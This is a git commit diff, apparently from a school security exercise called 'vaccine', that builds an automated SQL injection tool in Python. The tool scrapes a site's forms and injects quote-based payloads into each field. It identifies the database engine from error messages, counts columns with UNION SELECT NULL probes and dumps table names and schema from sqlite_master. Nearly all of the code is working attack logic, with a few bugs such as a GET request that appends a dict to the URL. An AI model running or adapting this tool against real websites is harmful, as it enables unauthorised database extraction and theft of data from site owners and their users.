7eba2ffb663506093bdad8b3661b3b8be49b7661
Tanguy EDELIN <tedelin@paul-f4Br7s1.clusters.42paris.fr>
2024-06-27 14:22:57 +0200

    vaccine improve parsing

---
+++ vaccine/utils.py
@@ -0,0 +1,71 @@
+from bs4 import BeautifulSoup
+from difflib import Differ
+from requests_html import HTMLSession
+
+session = HTMLSession()
+
+def get_all_forms(url):
+	res = session.get(url)
+	soup = BeautifulSoup(res.html.html, "html.parser")
+	return soup.find_all("form")
+
+
+def get_form_details(form):
+	details = {}
+	action = form.attrs.get("action").lower()
+	method = form.attrs.get("method", "get").lower()
+	inputs = []
+	for input_tag in form.find_all("input"):
+		input_type = input_tag.attrs.get("type", "text")
+		input_name = input_tag.attrs.get("name")
+		input_value =input_tag.attrs.get("value", "")
+		inputs.append({"type": input_type, "name": input_name, "value": input_value})
+	for select in form.find_all("select"):
+		select_name = select.attrs.get("name")
+		select_type = "select"
+		select_options = []
+		select_default_value = ""
+		for select_option in select.find_all("option"):
+			option_value = select_option.attrs.get("value")
+			if option_value:
+				select_options.append(option_value)
+				if select_option.attrs.get("selected"):
+					select_default_value = option_value
+		if not select_default_value and select_options:
+			select_default_value = select_options[0]
+		inputs.append({"type": select_type, "name": select_name, "values": select_options, "value": select_default_value})
+	for textarea in form.find_all("textarea"):
+		textarea_name = textarea.attrs.get("name")
+		textarea_type = "textarea"
+		textarea_value = textarea.attrs.get("value", "")
+		inputs.append({"type": textarea_type, "name": textarea_name, "value": textarea_value})
+	details["action"] = action
+	details["method"] = method
+	details["inputs"] = inputs
+	return details
+
+def find_first_pos(line):
+	x = 0
+	white_space = "\t\n\r\t\f "
+	for letter in line:
+		if white_space.find(letter) != -1:
+			x = x + 1
+			continue
+		return x + 1
+
+def diff_html(html1, html2):
+	if html1 == html2:
+		return
+	result = []
+	differ = Differ()
+	deltas = list(differ.compare(html1, html2))
+	for line in deltas:
+		if line.startswith('+') and not line[1:].isspace():
+			pos = find_first_pos(line[1:])
+			parsed_line = line[pos:len(line) - 1]
+			if parsed_line.startswith('<'):
+				parsed_line = BeautifulSoup(parsed_line, 'html.parser').get_text()
+			if len(parsed_line) != 0:
+				# print(f"[{parsed_line}]")
+				result.append(parsed_line)
+	return result
--- vaccine/vaccine.py
+++ vaccine/vaccine.py
@@ -1,9 +1,9 @@
-from bs4 import BeautifulSoup
 from requests_html import HTMLSession
 from urllib.parse import urljoin
 from pprint import pprint
 import argparse
 import requests
+from utils import get_all_forms, get_form_details, diff_html
 
 parser = argparse.ArgumentParser(description="Perform ARP poisoning on a target")
 parser.add_argument("url", help="The URL of the website to test for sqli")
@@ -12,7 +12,6 @@ parser.add_argument("-X", type=str, default="GET", metavar="METHOD", help="Enter
 
 args = parser.parse_args()
 entrypoints = [ "'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))"]
-session = HTMLSession()
 
 tables = {
 	"sqlite": "FROM sqlite_master"
@@ -20,20 +19,21 @@ tables = {
 infos = {
 	"sqlite": ["name", "sql"] # sql for colums, name for tables
 }
+# data[input_tag["name"]] = "' UNION SELECT sql, name FROM sqlite_master --"
 
-def make_request(payload, method):
+def make_request(injectable_input, form_details, payload, method):
+	data = {}
+	data[injectable_input] = payload
+	for input_tag in form_details["inputs"]:
+		if input_tag["type"] != "submit" and input_tag["name"] != injectable_input:
+			data[input_tag["name"]] = "eXaMpl34Tst"
 	if method == "POST":
-		return requests.post(args.url, data=payload)
-	return requests.get(args.url + payload)
+		return requests.post(args.url, data=data)
+	return requests.get(args.url + data)
 
 
 
-def get_all_forms(url):
-	res = session.get(url)
-	soup = BeautifulSoup(res.html.html, "html.parser")
-	return soup.find_all("form")
-
-def detect_engine(page):
+def detect_error(diff):
 	errors = {
 		"mysql": ["You have an error in your SQL syntax", "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in"],
 		"sqlite": ["SQLite3::query(): Unable to prepare statement"], 
@@ -41,102 +41,59 @@ def detect_engine(page):
 		"mssql": ["Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark after the character string"], 
 		"oracle": ["Oracle Database Error"]
 	}
-	for engine, error_messages in errors.items():
-		for error_message in error_messages:
-			if page.find(error_message) != -1:
-				return engine
+	for elt in diff:
+		for engine, error_messages in errors.items():
+			for error_message in error_messages:
+				if elt.find(error_message) != -1:
+					return engine
 	return "Unknown"
 
 def detect_database_engine(form_details, method):
+	page = requests.get(args.url)
 	working = []
 	engine = "Unknown"
 	for payload in entrypoints:
-		# value = ["eXample4TeSt"]
-		data = {}
 		for input_tag in form_details["inputs"]:
-			if input_tag["type"] != "submit":
-				data[input_tag["name"]] = payload
-		# data = {"login": "'", "password": "a"}
-		res = make_request(data, method)
-		html_response = res.text
-		engine = detect_engine(html_response)
-		if engine != "Unknown":
-			working.append((engine, payload))
+			if input_tag["type"] != "submit":		
+				res = make_request(input_tag["name"], form_details, payload, method)
+				diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
+				engine = detect_error(diff)
+			if engine != "Unknown" and input_tag["name"] != None:
+				working.append([engine, payload, input_tag["name"]])
 	return working
 
 
-
-def detect_number_of_columns(form_details, working, method):
-	data = {}
+def detect_number_of_columns(input, form_details, working, method):
 	columns = "NULL"
 	nb_colums = 1
 	while nb_colums > 0 and nb_colums < 20:
-		for input_tag in form_details["inputs"]:
-			if input_tag["type"] != "submit":
-				data[input_tag["name"]] = f"{working} UNION SELECT {columns} --"
-		res = make_request(data, method)
-		html_response = res.text
-		#if # analyze the response report incorrect number of columns
-		nb_colums += 1
+		res = make_request(input, form_details, f"{working} UNION SELECT {columns} --", method)
+		diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
+		error = detect_error(diff)
+		if error == "Unknown":
+			return nb_colums
 		columns += ",NULL"
-		return columns
-	return "Unknown"
+		nb_colums += 1
+	return 0
 
-
-def get_infos(infos, entrypoint, nb_params, field, engine):
-	for i in range(1, nb_params):
-		infos += ", NULL"
-	injection = f"{entrypoint} UNION SELECT {infos} {tables[engine]}"
-	data={field: injection, "password": "aa"}
-	# if (args.x == "POST"):
-	res = requests.post(args.url, data=data)
-	# else:
-		# requests.get(args.url + injection)
-	html_response = res.text
-	print(html_response)
-	# need to parse response to find infos needed
-
-
-
-def get_form_details(form):
-	details = {}
-	action = form.attrs.get("action").lower()
-	method = form.attrs.get("method", "get").lower()
-	inputs = []
-	for input_tag in form.find_all("input"):
-		input_type = input_tag.attrs.get("type", "text")
-		input_name = input_tag.attrs.get("name")
-		input_value =input_tag.attrs.get("value", "")
-		inputs.append({"type": input_type, "name": input_name, "value": input_value})
-	for select in form.find_all("select"):
-		select_name = select.attrs.get("name")
-		select_type = "select"
-		select_options = []
-		select_default_value = ""
-		for select_option in select.find_all("option"):
-			option_value = select_option.attrs.get("value")
-			if option_value:
-				select_options.append(option_value)
-				if select_option.attrs.get("selected"):
-					select_default_value = option_value
-		if not select_default_value and select_options:
-			select_default_value = select_options[0]
-		inputs.append({"type": select_type, "name": select_name, "values": select_options, "value": select_default_value})
-	for textarea in form.find_all("textarea"):
-		textarea_name = textarea.attrs.get("name")
-		textarea_type = "textarea"
-		textarea_value = textarea.attrs.get("value", "")
-		inputs.append({"type": textarea_type, "name": textarea_name, "value": textarea_value})
-	details["action"] = action
-	details["method"] = method
-	details["inputs"] = inputs
-	return details
+def dump_database(input, working, form_details, nb_columns, engine):
+	insert = infos[engine][1]
+	count = 1
+	while count < nb_columns:
+		insert += ",NULL"
+		count += 1
+	res = make_request(input, form_details, f"{working} UNION SELECT {insert} {tables[engine]} --", "POST")
+	diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
+	return diff
 
 if __name__ == "__main__":
+	session = HTMLSession()
 	page = session.get(args.url)
 	forms = get_all_forms(args.url)
 	for form in forms:
 		form_details = get_form_details(form)
 		engine = detect_database_engine(form_details, "POST")
 		print(engine)
-		# get_infos("name", "'", 2, "login", entry[0][0])
+		columns = detect_number_of_columns(engine[0][2], form_details, engine[0][1], "POST")
+		print(columns)
+		print(dump_database(engine[0][2], engine[0][1], form_details, columns, "sqlite"))
